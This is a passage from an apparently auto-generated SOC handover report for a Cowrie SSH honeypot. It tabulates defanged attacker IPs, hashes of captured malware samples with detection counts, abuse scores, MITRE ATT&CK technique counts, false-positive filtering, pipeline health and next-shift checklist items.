| `120.53.244[.]204` | **13** | 2026-05-28 13:09 | 2026-05-28 13:36 | 24m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `4.240.82[.]91` | **9** | 2026-05-28 10:25 | 2026-05-28 12:38 | 1m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `179.184.242[.]48` | **8** | 2026-05-28 13:24 | 2026-05-28 13:54 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `102.88.137[.]213` | **6** | 2026-05-28 08:05 | 2026-05-28 08:14 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `39.171.240[.]69` | **6** | 2026-05-28 08:41 | 2026-05-28 08:50 | 10m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.163.132[.]211` | **3** | 2026-05-28 10:42 | 2026-05-28 10:51 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `103.242.104[.]81` | **2** | 2026-05-28 13:23 | 2026-05-28 13:34 | 1m | 0 | `T1592` | 🟢 LOW |
| `118.163.132[.]212` | **2** | 2026-05-28 10:31 | 2026-05-28 10:36 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `18.221.195[.]141` | **2** | 2026-05-28 12:28 | 2026-05-28 12:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.223.0[.]198` | **2** | 2026-05-28 12:40 | 2026-05-28 12:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `49.72.212[.]22` | **2** | 2026-05-28 13:31 | 2026-05-28 13:33 | 3m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]238` | **2** | 2026-05-28 12:21 | 2026-05-28 12:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.34.170[.]76` | 1 | 2026-05-28 09:34 | 2026-05-28 09:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `101.47.156[.]21` | 1 | 2026-05-28 13:41 | 2026-05-28 13:41 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.207.109[.]243` | 1 | 2026-05-28 09:43 | 2026-05-28 09:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `118.145.144[.]95` | 1 | 2026-05-28 08:44 | 2026-05-28 08:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.186.18[.]243` | 1 | 2026-05-28 10:47 | 2026-05-28 10:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.193.61[.]170` | 1 | 2026-05-28 13:11 | 2026-05-28 13:11 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.155.125[.]131` | 1 | 2026-05-28 13:14 | 2026-05-28 13:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `181.116.220[.]140` | 1 | 2026-05-28 10:32 | 2026-05-28 10:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.247.137[.]155` | 1 | 2026-05-28 09:20 | 2026-05-28 09:20 | 1s | 0 | `T1592` | 🟢 LOW |
| `186.10.86[.]130` | 1 | 2026-05-28 10:50 | 2026-05-28 10:50 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.22.19[.]183` | 1 | 2026-05-28 13:54 | 2026-05-28 13:54 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.193.92[.]220` | 1 | 2026-05-28 08:54 | 2026-05-28 08:54 | 13s | 0 | `T1592` | 🟢 LOW |
| `211.72.129[.]212` | 1 | 2026-05-28 10:27 | 2026-05-28 10:27 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.144.223[.]65` | 1 | 2026-05-28 11:00 | 2026-05-28 11:02 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.224[.]238` | US | Censys, Inc. | **100** ⚠️ | 38 |
| `102.88.137[.]213` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `190.193.92[.]220` | AR | Telecom Argentina S.A. | **100** ⚠️ | 2 |
| `180.184.38[.]93` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `186.10.86[.]130` | CL | ENTEL CHILE S.A. | **100** ⚠️ | 50 |
| `39.171.240[.]69` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `101.47.156[.]21` | SG | BYTEPLUS | **100** ⚠️ | 30 |
| `118.193.61[.]170` | JP | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `180.76.225[.]175` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 20 |
| `4.240.82[.]91` | IN | Microsoft Corporation | **100** ⚠️ | 46 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 158 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 53 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 47 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 27 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 27 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 177 cases |
| Tool 34  | Credential Extractor        | ✅ 100 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (6.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 47 priority case(s) shown individually · 29 recon entry/entries in table (15 group(s) consolidating 104 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-28T13:56:07Z_
